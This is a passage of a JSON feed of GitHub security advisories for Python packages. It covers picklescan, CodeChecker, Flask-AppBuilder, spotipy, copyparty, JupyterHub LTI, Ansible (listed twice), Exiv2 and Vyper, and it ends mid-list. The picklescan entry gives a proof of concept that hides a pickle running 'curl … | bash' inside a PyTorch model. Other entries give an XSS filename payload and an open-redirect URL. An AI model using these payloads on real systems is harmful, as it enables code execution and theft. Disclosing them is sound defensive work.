{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"cve-2025-1889\">CVE-2025-1889</h3>\n<h3 id=\"summary\">Summary</h3>\n<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>\n<h3 id=\"details\">Details</h3>\n<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>\n<p>A typical attack works as follows:</p>\n<ul>\n<li>A PyTorch model (model.pt) is created and saved normally.</li>\n<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>\n<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>\n<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>\n<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport pickle\nimport torch\nimport zipfile\nfrom functools import partial\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (\"curl -s http://localhost:8080 | bash\",)\n\n# Create a directory inside the model\nos.makedirs(\"model\", exist_ok=True)\n\n# Create a hidden malicious pickle file\nwith open(\"model/config.p\", \"wb\") as f:\n    pickle.dump(RemoteCodeExecution(), f)\n\n# Create a benign model\nmodel = {}\nclass AutoLoad:\n    def __init__(self, path, **kwargs):\n        self.path = path\n        self.kwargs = kwargs\n\n    def __reduce__(self):\n        # Use functools.partial to create a partially applied function\n        # with torch.load and the pickle_file argument\n        return partial(torch.load, self.path, **self.kwargs), ()\n\nmodel['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)\ntorch.save(model, \"model.pt\")\n\n# Inject the second pickle into the model archive\nwith zipfile.ZipFile(\"model.pt\", \"a\") as archive:\n    archive.write(\"model/config.p\", \"model/config.p\")\n\n# Loading the model triggers execution of config.p\ntorch.load(\"model.pt\")\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: High</p>\n<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>\n<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>\n<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ol>\n<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>\n<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>\n<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\\x80\\x05).</li>\n<li>Block the following globals:\n - torch.load\n - Block functools.partial</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e\">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-769v-p64c-89pr\">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-769v-p64c-89pr",
            "title": "[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions",
            "date_modified": "2025-03-03T19:59:47.000Z",
            "date_published": "2025-03-03T19:59:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-769v-p64c-89pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>CodeChecker versions up to 6.24.5 contain an open redirect vulnerability due to missing protections against multiple slashes after the product name in the URL's path segment.  This results in bypassing protections against CVE-2021-28861, leading to the same open redirect pathway.</p>\n<h2 id=\"details\">Details</h2>\n<p>CodeChecker processes GET requests by first rewriting the path segment of the URL, and then passing the rewritten URL to the webserver framework.\nWhen trimming the product name from the URL, no sanitization was performed on the remaining URL, which reintroduced the same issue as CVE-2021-28861, leading to the same open redirect pathway using URLs such as <code>/Default//attacker.com/%2f..</code>.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>The vulnerability allows an attacker to create a hyperlink that looks like a legitimate CodeChecker URL, but redirects to an attacker-supplied website when clicked.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Ericsson/codechecker/security/advisories/GHSA-g839-x3p3-g5fm\">https://github.com/Ericsson/codechecker/security/advisories/GHSA-g839-x3p3-g5fm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1300\">https://nvd.nist.gov/vuln/detail/CVE-2025-1300</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g839-x3p3-g5fm\">https://github.com/advisories/GHSA-g839-x3p3-g5fm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g839-x3p3-g5fm",
            "title": "[codechecker] CodeChecker open redirect when URL contains multiple slashes after the product name",
            "date_modified": "2025-03-03T19:53:19.000Z",
            "date_published": "2025-03-03T19:53:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g839-x3p3-g5fm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>User enumeration in database authentication in Flask-AppBuilder &lt;= 4.5.3 and werkzeug &gt;= 3.0.0. Allows for a non authenticated user to enumerate existing usernames by timing the response time from the server when brute forcing requests to login.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to flask-appbuilder&gt;=4.5.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Downgrade werkzeug to &lt;3.0.0</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-p8q5-cvwx-wvwp\">https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-p8q5-cvwx-wvwp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24023\">https://nvd.nist.gov/vuln/detail/CVE-2025-24023</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p8q5-cvwx-wvwp\">https://github.com/advisories/GHSA-p8q5-cvwx-wvwp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p8q5-cvwx-wvwp",
            "title": "[flask-appbuilder] Flask-AppBuilder Observable Response Discrepancy",
            "date_modified": "2025-03-03T19:41:19.000Z",
            "date_published": "2025-03-03T15:26:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p8q5-cvwx-wvwp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>CacheHandler</code> class creates a cache file to store the auth token here: <a href=\"https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98\">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></p>\n<p>The file created has <code>rw-r--r--</code> (644) permissions by default, when it could be locked down to <code>rw-------</code> (600) permissions. I think <code>600</code> is a sensible default.</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/0b7ebbc1-a27a-4528-ab6a-135c7886766a\"></p>\n<h3 id=\"details\">Details</h3>\n<p>This leads to overly broad exposure of the spotify auth token. If this token can be read by an attacker (another user on the machine, or a process running as another user), it can be used to perform administrative actions on the Spotify account, depending on the scope granted to the token.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run an application that uses spotipy with client creation like this:</p>\n<pre><code class=\"language-python\">from pathlib import Path\nimport spotipy\nfrom os import getenv\n\ndef create_spotify_client(client_id: str, client_secret: str) -&gt; spotipy.Spotify:\n    \"\"\"Create and return an authenticated Spotify client.\n\n    Args:\n        client_id: Spotify API client ID\n        client_secret: Spotify API client secret\n\n    Returns:\n        An authenticated Spotify client instance\n    \"\"\"\n    cache_path = Path.home() / \".cache\" / \"spotify-backup/.auth_cache\"\n    cache_path.parent.mkdir(parents=True, exist_ok=True)\n    cache_handler = spotipy.cache_handler.CacheFileHandler(cache_path=str(cache_path))\n\n    client = spotipy.Spotify(\n        auth_manager=spotipy.oauth2.SpotifyOAuth(\n            client_id=client_id,\n            client_secret=client_secret,\n            redirect_uri=\"http://localhost:8000/callback\",\n            cache_handler=cache_handler,\n            scope=[\n                \"user-library-read\",\n                \"playlist-read-private\",\n                \"playlist-read-collaborative\",\n            ],\n        )\n    )\n\n    return client\n\ncreate_spotify_client()\n</code></pre>\n<p>And then check the file permissions on the cache file that was created with:</p>\n<pre><code class=\"language-bash\">$ ls -la ~/.cache/spotify-backup/.auth_cache`\n.rw-r--r--. alichtman alichtman 562 B Thu Feb 20 02:12:33 2025 ï€– /home/alichtman/.cache/spotify-backup/.auth_cache\n</code></pre>\n<p>If this issue is combined with another misconfiguration, like having <code>o+r</code> permissions set on your home directory, an attacker will be able to read this file and steal this auth token.</p>\n<p>Good defense in depth would be to restrict read permissions on this cache file that contains an auth token</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Potential exposure of Spotify auth token to other users with access to the machine. A worst case scenario is if the token is granted all permissions, and can be used to do any of:</p>\n<ul>\n<li>exfiltrate spotify likes / saved playlists</li>\n<li>delete your content</li>\n<li>modify your content w/o your permission</li>\n</ul>\n<p>If someone were to discover an RCE in Spotify that you could trigger on a machine by having a song played (or song metadata parsed or something), this auth token could maybe be used to add a song to a playlist, or control playback (allowing further exploitation).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599\">https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27154\">https://nvd.nist.gov/vuln/detail/CVE-2025-27154</a></li>\n<li><a href=\"https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2\">https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2</a></li>\n<li><a href=\"https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98\">https://github.com/spotipy-dev/spotipy/blob/master/spotipy/cache_handler.py#L93-L98</a></li>\n<li><a href=\"https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1\">https://github.com/spotipy-dev/spotipy/releases/tag/2.25.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pwhh-q4h6-w599\">https://github.com/advisories/GHSA-pwhh-q4h6-w599</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pwhh-q4h6-w599",
            "title": "[spotipy] Spotipy's cache file, containing spotify auth token, is created with overly broad permissions",
            "date_modified": "2025-02-28T02:34:39.000Z",
            "date_published": "2025-02-28T02:34:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pwhh-q4h6-w599"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A <a href=\"https://capec.mitre.org/data/definitions/588.html\">DOM-Based XSS</a> was discovered in <a href=\"https://github.com/9001/copyparty\">copyparty</a>, a portable fileserver. The vulnerability is considered low-risk.</p>\n<h2 id=\"details\">Details</h2>\n<p>By handing someone a maliciously-named file, and then tricking them into dragging the file into copyparty's Web-UI, an attacker could execute arbitrary javascript with the same privileges as that user. For example, this could give unintended read-access to files owned by that user. The bug is triggered by the drag-drop action itself; it is not necessary to actually initiate the upload. The file must be empty (zero bytes).</p>\n<p>Note: As a general-purpose webserver, it is intentionally possible to upload HTML-files with arbitrary javascript in <code>&lt;script&gt;</code> tags, which will execute when the file is opened. The difference is that this vulnerability would trigger execution of javascript during the act of uploading, and not when the uploaded file was opened.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (POC)</h2>\n<ol>\n<li>Create an empty file named <code>&lt;img src=x onerror=\"alert(1)\"&gt;</code></li>\n<li>Drag-and-drop the file into the browser to initiate an upload</li>\n<li>The <code>alert(1)</code> is executed</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r\">https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27145\">https://nvd.nist.gov/vuln/detail/CVE-2025-27145</a></li>\n<li><a href=\"https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd\">https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd</a></li>\n<li><a href=\"https://github.com/9001/copyparty/releases/tag/v1.16.15\">https://github.com/9001/copyparty/releases/tag/v1.16.15</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m2jw-cj8v-937r\">https://github.com/advisories/GHSA-m2jw-cj8v-937r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m2jw-cj8v-937r",
            "title": "[copyparty] copyparty renders unsanitized filenames as HTML when user uploads empty files",
            "date_modified": "2025-02-26T20:06:58.000Z",
            "date_published": "2025-02-26T20:06:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m2jw-cj8v-937r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Only users that has configured a JupyterHub installation to use the authenticator class <code>LTI13Authenticator</code> are influenced.</p>\n<p>LTI13Authenticator that was introduced in <code>jupyterhub-ltiauthenticator</code> 1.3.0 wasn't validating JWT signatures. This is believed to allow the LTI13Authenticator to authorize a forged request granting access to existing and new user identities.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>None.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164\">This code segment</a> didn't validate a JWT signature.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp\">https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-25574\">https://nvd.nist.gov/vuln/detail/CVE-2023-25574</a></li>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164\">https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164</a></li>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01\">https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcgx-2gcr-p3hp\">https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcgx-2gcr-p3hp",
            "title": "[jupyterhub-ltiauthenticator] LTI JupyterHub Authenticator does not properly validate JWT Signature",
            "date_modified": "2025-02-25T17:48:35.000Z",
            "date_published": "2025-02-25T17:48:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcgx-2gcr-p3hp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8775\">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-8775\">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2312119\">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:8969\">https://access.redhat.com/errata/RHSA-2024:8969</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:9894\">https://access.redhat.com/errata/RHSA-2024:9894</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:10762\">https://access.redhat.com/errata/RHSA-2024:10762</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1249\">https://access.redhat.com/errata/RHSA-2025:1249</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpxc-vmjf-9fcj\">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035\">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj",
            "title": "[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File",
            "date_modified": "2025-02-24T15:15:39.000Z",
            "date_published": "2024-09-16T14:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8775\">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-8775\">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2312119\">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:8969\">https://access.redhat.com/errata/RHSA-2024:8969</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:9894\">https://access.redhat.com/errata/RHSA-2024:9894</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:10762\">https://access.redhat.com/errata/RHSA-2024:10762</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1249\">https://access.redhat.com/errata/RHSA-2025:1249</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpxc-vmjf-9fcj\">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035\">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj",
            "title": "[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File",
            "date_modified": "2025-02-24T15:15:39.000Z",
            "date_published": "2024-09-16T14:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A heap buffer overflow was found in Exiv2 versions v0.28.0 to v0.28.4. Versions prior to v0.28.0, such as v0.27.7, are <strong>not</strong> affected. Exiv2 is a command-line utility and C++ library for reading, writing, deleting, and modifying the metadata of image files. The heap overflow is triggered when Exiv2 is used to write metadata into a crafted image file. An attacker could potentially exploit the vulnerability to gain code execution, if they can trick the victim into running Exiv2 on a crafted image file.</p>\n<p>Note that this bug is only triggered when writing the metadata, which is a less frequently used Exiv2 operation than reading the metadata. For example, to trigger the bug in the Exiv2 command-line application, you need to add an extra command-line argument such as <code>fixiso</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The bug is fixed in version v0.28.5.</p>\n<h3 id=\"references\">References</h3>\n<p>Issue: <a href=\"https://github.com/Exiv2/exiv2/issues/3168\">https://github.com/Exiv2/exiv2/issues/3168</a>\nFix: <a href=\"https://github.com/Exiv2/exiv2/pull/3174\">https://github.com/Exiv2/exiv2/pull/3174</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please see our <a href=\"https://github.com/Exiv2/exiv2/security/policy\">security policy</a> for information about Exiv2 security.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7\">https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26623\">https://nvd.nist.gov/vuln/detail/CVE-2025-26623</a></li>\n<li><a href=\"https://github.com/Exiv2/exiv2/issues/3168\">https://github.com/Exiv2/exiv2/issues/3168</a></li>\n<li><a href=\"https://github.com/Exiv2/exiv2/pull/3174\">https://github.com/Exiv2/exiv2/pull/3174</a></li>\n<li><a href=\"https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4\">https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h4-fx85-qcx7\">https://github.com/advisories/GHSA-38h4-fx85-qcx7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h4-fx85-qcx7",
            "title": "[Exiv2] Exiv2 allows Use After Free",
            "date_modified": "2025-02-21T23:53:06.000Z",
            "date_published": "2025-02-21T23:53:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h4-fx85-qcx7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Multiple evaluation of a single expression is possible in the iterator target of a for loop. While the iterator expression cannot produce multiple writes, it can consume side effects produced in the loop body (e.g. read a storage variable updated in the loop body) and thus lead to unexpected program behavior. Specifically, reads in iterators which contain an ifexp (e.g. <code>for s: uint256 in ([read(), read()] if True else [])</code>) may interleave reads with writes in the loop body.</p>\n<p>The fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4488\">https://github.com/vyperlang/vyper/pull/4488</a>.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>Vyper for loops allow two kinds of iterator targets, namely the <code>range()</code> builtin and an iterable type, like SArray and DArray. </p>\n<p>During codegen, iterable lists are required to not produce any side-effects (in the following code, <code>range_scope</code> forces <code>iter_list</code> to be parsed in a constant context, which is checked against <code>is_constant</code>).</p>\n<pre><code class=\"language-python\">def _parse_For_list(self):\n    with self.context.range_scope():\n        iter_list = Expr(self.stmt.iter, self.context).ir_node\n    ...\n\ndef range_scope(self):\n    prev_value = self.in_range_expr\n    self.in_range_expr = True\n    yield\n    self.in_range_expr = prev_value\n\ndef is_constant(self):\n    return self.constancy is Constancy.Constant or self.in_range_expr\n</code></pre>\n<p>However, this does not prevent the iterator from consuming side effects provided by the body of the loop. For dynamic arrays, the compiler simply panics:</p>\n<pre><code class=\"language-vyper\">x: DynArray[uint256, 3]\n\n@external\ndef test():\n    for i: uint256 in (self.usesideeffect() if True else self.usesideeffect()):\n        pass\n\n@view\ndef usesideeffect() -&gt; DynArray[uint256, 3]:\n    return self.x\n</code></pre>\n<p>For SArrays on the other hand, <code>iter_list</code> is instantiated in the body of a <code>repeat</code> ir, so it can be evaluated several times.</p>\n<p>Here are three illustrating examples. In the first example, the following test case pre-evaluates the iter list and stores the result to a temporary list in memory. So the list is only evaluated once, before entry into the loop body, and the log output will be 0, 0, 0.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256\n\n@deploy\ndef __init__():\n    self.x = 0\n\n@external\ndef test():\n    for i: uint256 in [self.usesideeffect(), self.usesideeffect(), self.usesideeffect()]:\n        self.x += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256:\n    return self.x\n</code></pre>\n<p>However, in the next two examples, because the iterator target is not a list literal, it will be evaluated in the loop body. In the second example, <code>iter_list</code> is an ifexp, thus it will be evaluated lazily in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256\n\n@deploy\ndef __init__():\n    self.x = 0\n\n@external\ndef test():\n    for i: uint256 in ([self.usesideeffect(), self.usesideeffect(), self.usesideeffect()] if True else self.otherclause()):\n        self.x += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256:\n    return self.x\n\n@view\ndef otherclause() -&gt; uint256[3]:\n    return [0, 0, 0]\n</code></pre>\n<p>In the third example, <code>iter_list</code> is also an ifexp, thus it will only be evaluated in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256[3]\n\n@deploy\ndef __init__():\n    self.x = [0, 0, 0]\n\n@external\ndef test():\n    for i: uint256 in (self.usesideeffect() if True else self.otherclause()):\n        self.x[0] += 1\n        self.x[1] += 1\n        self.x[2] += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256[3]:\n    return self.x\n\n@view\ndef otherclause() -&gt; uint256[3]:\n    return [0, 0, 0]\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67\">https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4488\">https://github.com/vyperlang/vyper/pull/4488</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27104\">https://nvd.nist.gov/vuln/detail/CVE-2025-27104</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h33q-mhmp-8p67\">https://github.com/advisories/GHSA-h33q-mhmp-8p67</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h33q-mhmp-8p67",
            "title": "[vyper] Vyper has a double eval in For List Iter",
            "date_modified": "2025-02-24T20:26:23.000Z",
            "date_published": "2025-02-21T22:43:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h33q-mhmp-8p67"
            },
            "tags": [
                "severity"
            ]
        },
        {
